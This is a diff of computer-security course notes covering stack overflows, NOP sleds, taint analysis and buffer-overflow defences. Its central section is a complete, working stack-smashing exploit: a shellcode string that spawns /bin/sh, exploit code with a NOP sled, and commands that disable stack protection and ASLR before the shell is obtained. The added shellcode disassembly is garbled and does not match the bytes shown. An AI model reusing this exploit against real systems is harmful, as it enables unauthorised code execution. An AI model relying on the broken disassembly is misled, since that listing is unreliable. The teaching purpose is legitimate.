-A stack overflow, or stack smashing, is a special case of buffer overflow (targeting the stack or heap), where data can overflow allocated buffer and overwrite return address:
+A stack overflow, or stack smashing, is a special case of buffer overflow targeting the stack or heap, where data can overflow allocated buffer and overwrite the return address.
 
-- `gets` read from input until newline or end of file
+<!-- - `gets` read from input until newline or end of file
 
-    ```c
-    void main() {
-        char buffer[512];
-        gets(buffer);
-    }
-    ```
+```c
+void main() {
+    char buffer[512];
+    gets(buffer);
+}
+```
 
 - `strcpy` and `strcat` copy data
 
-    ```c
-    int main(int argc, char **argv) {
-        char buffer[512];
-        strcpy(buffer, argv[1]);
-    }
-    ```
+```c
+int main(int argc, char **argv) {
+    char buffer[512];
+    strcpy(buffer, argv[1]);
+}
+```
 
 - `sprintf` and `scanf` print data
 
-    ```c
-    void main(int argc, char **argv) {
-        char buffer[512];
-        sprintf(buffer, "program %s is starting\n", argv[0]);
-    }
-    ```
+```c
+void main(int argc, char **argv) {
+    char buffer[512];
+    sprintf(buffer, "program %s is starting\n", argv[0]);
+}
+``` -->
 
 #### <a name="4.3.1" class="anchor"></a> [NOP slide](#4.3.1)
 
-A [NOP slide](https://en.wikipedia.org/wiki/NOP_slide), or `nop`-sled, is an optional sequence of no-nothing instruction used to fill stack and eventually reach a jump to shellcode, which is any code used to start a shell, such as `execve("/bin/sh")`.
+A [NOP slide](https://en.wikipedia.org/wiki/NOP_slide), or `nop`-sled, is an optional sequence of do-nothing instructions used to fill stack and eventually reach a jump to some injected shellcode, which is any code used to start a shell, such as `execve("/bin/sh")`.
 
-#### <a name="4.3.2" class="anchor"></a> [**Example**: buffer overflow attack](#4.3.2)
+#### <a name="4.3.2" class="anchor"></a> [Stack-based buffer overflow attacks](#4.3.2)
 
-Below is an example buffer overflow attack using `nop`-sled and injected shellcode:
+Below is an example buffer overflow attack using `nop`-sled and injecting shellcode.
 
 ```c
 /* program.c */
@@ -752,72 +696,105 @@ int main(int argc, char **argv) {
 }
 ```
 
-- exploit for vulnerable program, where shellcode is hexadecimal string encoding machine instructions (note that shellcode can also be written in assembly and inserted into executable by compiler, `gcc -o exploit exploit.c shellcode.s`, and `extern char shellcode[];` instead of `unsigned char code[] = ... ;`)
+An exploit for vulnerable program, where shellcode is hexadecimal string encoding machine instructions (shellcode can also be written in assembly and inserted into executable by compiler, `gcc -o exploit exploit.c shellcode.s`, and `extern char shellcode[];` replacing `unsigned char code[] = ... ;`).
 
-    ```c
-    /* exploit.c */
-    #include <stdio.h>
-    #include <string.h>
-    #include <stdlib.h>
+```c
+/* exploit.c */
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
-    #define PROGRAM "./program"
+#define PROGRAM "./program"
 
-    /* shellcode */
-    unsigned char code[] =
-        "\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43"
-        "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";
+/* shellcode */
+unsigned char code[] =
+    "\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43"
+    "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";
 
-    /* inline macro to get stack pointer */
-    __inline__ unsigned int get_esp(void) {
-        unsigned int res;
-        __asm__("movl %%esp, %0" : "=a" (res));
-        return res;
+/* inline macro to get stack pointer */
+__inline__ unsigned int get_esp(void) {
+    unsigned int res;
+    __asm__("movl %%esp, %0" : "=a" (res));
+    return res;
+}
+
+int main(int argc, char **argv) {
+    unsigned int address, i, offset = 0;
+    char buffer[768];
+    char *n[] = { PROGRAM, buffer, NULL };
+
+    /* offset from base address */
+    if (argv[1]) {
+        offset = strtol(argv[1], NULL, 10);
     }
 
-    int main(int argc, char **argv) {
-        unsigned int address, i, offset = 0;
-        char buffer[768];
-        char *n[] = { PROGRAM, buffer, NULL };
+    address = get_esp() + offset;
+    fprintf(stderr, "using address %#010x\n", address);
+    memset(buffer, 0, sizeof(buffer));
 
-        /* offset from base address */
-        if (argv[1]) {
-            offset = strtol(argv[1], NULL, 10);
-        }
-
-        address = get_esp() + offset;
-        fprintf(stderr, "using address %#010x\n", address);
-        memset(buffer, 0, sizeof(buffer));
-
-        /* fill buffer with addresses, four byte at a time */
-        for (i = 0; i < sizeof(buffer); i += 4) {
-            *(unsigned int *)(buffer + i) = address;
-        }
-
-        /* nop-sled to fill half buffer with nop */
-        memset(buffer, 0x90, sizeof(buffer)/2);
-
-        /* place shellcode after nop-sled, rest is filled with addresses */
-        memcpy(buffer + sizeof(buffer)/2, code, strlen(code));
-
-        execve(n[0], n, NULL);
-        perror("execve");
-        exit(1);
+    /* fill buffer with addresses, four byte at a time */
+    for (i = 0; i < sizeof(buffer); i += 4) {
+        *(unsigned int *)(buffer + i) = address;
     }
-    ```
 
-- running exploit (note that `-fno-stack-protector` disables stack protection, which is enabled by default on some Linux distributions, and `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` disables address space layout randomization, or ASLR)
+    /* nop-sled to fill half buffer with nop */
+    memset(buffer, 0x90, sizeof(buffer)/2);
 
-    ```
-    $ CFLAGS="-m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2"
-    $ cc $CFLAGS -o program program.c
-    $ cc $CFLAGS -o exploit exploit.c
-    $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-    0
-    $ ./exploit 1500
-    using address 0x0xbffffa34
-    buffer@0xbffff970: ...
-    bash$
-    ```
+    /* place shellcode after nop-sled, rest is filled with addresses */
+    memcpy(buffer + sizeof(buffer)/2, code, strlen(code));
+
+    execve(n[0], n, NULL);
+    perror("execve");
+    exit(1);
+}
+```
+
+For the curious, disassemble shellcode.
+
+```
+$ python -c 'print("\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43" + "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh")' | ndisasm -u - 
+```
+
+```
+00000000  C3                ret
+00000001  AB                stosd
+00000002  155B31C380        adc eax,0x80c3315b
+00000007  C2895B            ret 0x5b89
+0000000A  08C2              or dl,al
+0000000C  884307            mov [ebx+0x7],al
+0000000F  C28D4B            ret 0x4b8d
+00000012  08C2              or dl,al
+00000014  89430C            mov [ebx+0xc],eax
+00000017  C289C3            ret 0xc389
+0000001A  82                db 0x82
+0000001B  C2B00B            ret 0xbb0
+0000001E  C3                ret
+0000001F  8D                db 0x8d
+00000020  C280C3            ret 0xc380
+00000023  A8C3              test al,0xc3
+00000025  A6                cmpsb
+00000026  C3                ret
+00000027  BFC3BFC3BF        mov edi,0xbfc3bfc3
+0000002C  2F                das
+0000002D  62696E            bound ebp,[ecx+0x6e]
+00000030  2F                das
+00000031  7368              jnc 0x9b
+00000033  0A                db 0x0a
+```
+
+Run exploit (`-fno-stack-protector` disables stack protection, which is enabled by default on some Linux distributions, and `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` disables address space layout randomization, ASLR).
+
+```
+$ CFLAGS="-m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2"
+$ cc $CFLAGS -o program program.c
+$ cc $CFLAGS -o exploit exploit.c
+$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+0
+$ ./exploit 1500
+using address 0x0xbffffa34
+buffer@0xbffff970: ...
+bash$
+```
 
 ## <a name="5" class="anchor"></a> [5. Secure system design](#5)
 
@@ -825,46 +802,48 @@ int main(int argc, char **argv) {
 
 A system design involves both hardware and software, where software is easy to change, which is good for functionality but bad for security and generally bad for performance, and hardware is hard to change, which is bad for functionality but good for security:
 
-- [AES instruction set](https://en.wikipedia.org/wiki/AES_instruction_set) implement cryptography instructions
+- [AES instruction set](https://en.wikipedia.org/wiki/AES_instruction_set) implements cryptography instructions
 
 - [Intel SGX](https://en.wikipedia.org/wiki/Software_Guard_Extensions) support encrypted computation, such as for cloud computing applications
 
 - hardware primitives, such as [Physical unclonable function](https://en.wikipedia.org/wiki/Physical_unclonable_function), which provides unpredictable and repeatable randomness (fingerprint)
 
-A secure system design favor simplicity, such as fail-safe defaults (key lengths, whitelist better than blacklist) and assume non-expert users, so keep user interface simple and avoid choices. Reduce need to trust other parts of system (kernel is assumed to be trusted) and grant least privileges possible, such as restricting flow of sensitive data, secure compartments (operating system), `seccomp` system call isolates process by limiting possible interactions. Layers of security can be used to further secure systems, such as firewall, encrypting data at rest, using type-safe programming languages, and logging relevant operational information.
+A secure system design favor simplicity, such as fail-safe defaults (key lengths, whitelist better than blacklist) and assume non-expert users, so keep user interface simple and avoid choices. It is preferable to reduce need to trust other parts of system (kernel is assumed to be trusted) and grant least privileges possible, such as restricting flow of sensitive data, secure compartments (operating system), `seccomp` system call isolates process by limiting possible interactions.
+
+Layers of security can be used to further secure systems, such as firewall, encrypting data at rest, using type-safe programming languages, and logging relevant operational information.
 
 #### <a name="5.1.1" class="anchor"></a> [Tainted flow analysis](#5.1.1)
 
 Trusting unvalidated inputs is the root cause of many attacks, such as a program getting unsafe input, or tainted data, from a user and assuming it is safe, or untainted:
 
-- example vulnerable program (note that an input such as `name="%s%s%s"` would crash program and `name="...%n..."` would write to memory)
+- example vulnerable program (an input such as `name="%s%s%s"` would crash program and `name="...%n..."` would write to memory)
 
-    ```c
-    char *name = fgets( /* ... */, network_fd);
-    printf(name); /* vulnerable to format string */
-    ```
+```c
+char *name = fgets( /* ... */, network_fd);
+printf(name); /* vulnerable to format string */
+```
 
-In tainted flow analysis, such as [Taint checking](https://en.wikipedia.org/wiki/Taint_checking), the goal is to prove that no tainted data is used where untainted data is expected for all possible inputs (note that `untainted` indicate trusted and `tainted` indicate untrusted):
+In tainted flow analysis, such as [Taint checking](https://en.wikipedia.org/wiki/Taint_checking), the goal is to prove that no tainted data is used where untainted data is expected for all possible inputs (`untainted` indicate trusted and `tainted` indicate untrusted):
 
 - legal flow
 
-    ```c
-    void f(tainted int);
-    
-    untainted int a = /* ... */ ;
-    f(a); /* function expect tainted, and input is untainted, so legal flow */
-    ```
+```c
+void f(tainted int);
+
+untainted int a = /* ... */ ;
+f(a); /* function expect tainted, and input is untainted, so legal flow */
+```
 
 - illegal flow
 
-    ```c
-    void f(untainted int);
-    
-    tainted int a = /* ... */ ;
-    f(a); /* function assume untainted, and input is tainted, so illegal flow */
-    ```
+```c
+void f(untainted int);
 
-#### <a name="5.1.2" class="anchor"></a> [**Example**: tracking tainted data in programs](#5.1.2)
+tainted int a = /* ... */ ;
+f(a); /* function assume untainted, and input is tainted, so illegal flow */
+```
+
+#### <a name="5.1.2" class="anchor"></a> [Tracking tainted data in programs](#5.1.2)
 
 Below is an example tainted flow analysis on vulnerable program at each line of execution:
     
@@ -882,12 +861,12 @@ void copy(tainted char *src, untainted char *dst, int len) {
 
 ### <a name="5.2" class="anchor"></a> [5.2 Preventing buffer overflows](#5.2)
 
-Buffer overflow attacks can sometimes be prevented using programming languages with boundary checking, such as Java or Python, or contained using virtualization. Below are a few other common methods:
+Buffer overflow attacks can sometimes be prevented using programming languages with boundary checking, such as Java or Python, or contained using virtualization. Here are a few other common methods:
 
 - [StackGuard](https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf) is a canary-based method to protect or detect potential danger, where a canary-value is placed on stack, which can be verified to not be corrupted during execution
 
 - non-executable memory, or [NX-bit](https://en.wikipedia.org/wiki/NX_bit), can be used to segregate area in memory used by code and data
 
-- randomized addresses and instructions, such as [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), which can be used to randomize address space layout (note that instructions can also be encrypted in memory and decrypted before execution, but substantial overhead)
+- randomized addresses and instructions, such as [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), which can be used to randomize address space layout (instructions can also be encrypted in memory and decrypted before execution, but substantial overhead)
 
-For more methods, see: [Return-oriented programming (ROP)](https://en.wikipedia.org/wiki/Return-oriented_programming).
+For further reading, see: [Return-oriented programming (ROP)](https://en.wikipedia.org/wiki/Return-oriented_programming).
